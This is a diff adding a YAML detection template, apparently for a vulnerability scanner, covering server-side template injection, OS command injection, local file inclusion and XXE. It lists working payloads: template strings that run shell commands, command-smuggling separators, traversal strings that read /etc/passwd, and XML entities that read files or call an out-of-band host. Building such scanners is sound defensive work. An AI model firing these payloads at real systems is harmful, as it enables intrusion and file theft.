@@ -1,0 +1,101 @@
+id: injection-advanced
+category: detection
+title: Advanced Injection Detection (SSTI, Command, LFI, XXE)
+info:
+  name: Advanced Injection Patterns
+  severity: critical
+  cwe: CWE-94
+  owasp: "A03:2021"
+  description: >
+    Beyond SQL injection and XSS, several injection classes can lead directly to
+    Remote Code Execution (RCE): Server-Side Template Injection (SSTI),
+    OS Command Injection, Local File Inclusion (LFI), and XML External Entity (XXE).
+
+ssti:
+  cwe: CWE-1336
+  description: >
+    SSTI occurs when user input is embedded into template engines (Jinja2, Twig,
+    Freemarker, Velocity). Can escalate to full RCE via template engine internals.
+  detection_payloads:
+    - input: "{{7*7}}"
+      expected: "49"
+      engine: Jinja2/Twig
+    - input: "${7*7}"
+      expected: "49"
+      engine: Freemarker/Velocity
+    - input: "#{7*7}"
+      expected: "49"
+      engine: Ruby ERB/Java EL
+    - input: "<%= 7*7 %>"
+      expected: "49"
+      engine: ERB
+  escalation_payloads:
+    jinja2: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    twig: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    freemarker: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+
+command_injection:
+  cwe: CWE-78
+  description: >
+    OS command injection occurs when user input is passed to system shell commands.
+    Can lead to full system compromise.
+  detection_payloads:
+    - "; id"
+    - "| id"
+    - "$(id)"
+    - "`id`"
+    - "|| id"
+    - "&& id"
+  blind_payloads:
+    - "; sleep 5"
+    - "| sleep 5"
+    - "$(sleep 5)"
+    - "& ping -c 5 127.0.0.1 &"
+  match_patterns:
+    - "uid="
+    - "root:"
+
+lfi:
+  cwe: CWE-98
+  description: >
+    Local File Inclusion allows reading arbitrary files from the server.
+    Can escalate to RCE via log poisoning, PHP wrappers, or /proc/self/environ.
+  detection_payloads:
+    - "../../../../../../etc/passwd"
+    - "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "....//....//....//etc/passwd"
+    - "..%252f..%252f..%252fetc/passwd"
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "file:///etc/passwd"
+  match_patterns:
+    - "root:x:0:0"
+    - "[boot loader]"
+    - "<?php"
+
+xxe:
+  cwe: CWE-611
+  description: >
+    XML External Entity injection exploits XML parsers that process external entity
+    references. Can read local files, perform SSRF, or cause denial of service.
+  detection_payloads:
+    - |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <data>&xxe;</data>
+    - |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://COLLABORATOR_URL">
+      ]>
+      <data>&xxe;</data>
+  blind_detection: >
+    Use out-of-band (OOB) technique with external DTD hosted on attacker server
+    to exfiltrate data when direct response is not visible.
+
+tags:
+  - injection
+  - rce
+  - critical
+  - owasp-top10
